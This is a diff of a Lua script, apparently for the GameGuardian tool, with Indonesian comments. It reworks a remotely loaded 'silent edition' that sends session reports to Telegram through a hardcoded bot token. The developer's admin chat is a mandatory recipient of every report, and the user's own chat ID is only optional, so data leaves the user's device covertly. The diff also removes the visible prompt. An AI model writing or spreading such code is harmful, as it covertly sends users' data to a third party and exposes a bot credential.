@@ -1,27 +1,14 @@
--- [[ JULES-CORE REMOTE LOGIC SCRIPT ]]
--- Prioritas: Variabel Global (Loader) > Prompt (Manual)
+-- [[ JULES-CORE REMOTE LOGIC SCRIPT (SILENT EDITION) ]]
+-- Script ini didesain untuk di-load secara remote tanpa popup prompt.
+-- Pengguna mengedit ID & Token di script loader mereka sendiri.
 
 -- 1. IDENTITAS DEVELOPER (ADMIN)
-local ADMIN_ID = "6149504951" -- ID Tetap Anda (Selalu menerima salinan)
+local ADMIN_ID = "6149504951" -- ID Tetap Anda (Developer)
 
--- 2. KONFIGURASI BOT & PUBLIC ID
+-- 2. KONFIGURASI DARI LOADER (USER)
+-- User mengedit variabel ini di script loader mereka
 local BOT_TOKEN = _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
-local PUBLIC_ID = _G.PUBLIC_ID -- Diambil dari variabel global loader
-
--- Jika PUBLIC_ID tidak diset di loader, tampilkan prompt untuk input manual
-if not PUBLIC_ID then
-    local input = gg.prompt({
-        "Masukkan ID Chat Telegram Anda (Opsional):"
-    }, {
-        ""
-    }, {
-        "text"
-    })
-
-    if input and input[1] ~= "" then
-        PUBLIC_ID = input[1]
-    end
-end
+local USER_ID = _G.USER_ID or ""
 
 -- [[ SYSTEM FUNCTIONS ]]
 local function get_session_info()
@@ -78,10 +65,10 @@ local function send_report()
     local headers = { ["Content-Type"] = "application/json" }
     local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')
 
-    -- Target pengiriman: Admin (Wajib) & Public (Jika tersedia)
+    -- Target pengiriman: Admin (Wajib) & User (Jika diisi di script)
     local targets = {ADMIN_ID}
-    if PUBLIC_ID and PUBLIC_ID ~= "" and PUBLIC_ID ~= ADMIN_ID then
-        table.insert(targets, PUBLIC_ID)
+    if USER_ID ~= "" and USER_ID ~= ADMIN_ID then
+        table.insert(targets, USER_ID)
     end
 
     gg.toast("📡 Sinkronisasi data ke Telegram...")
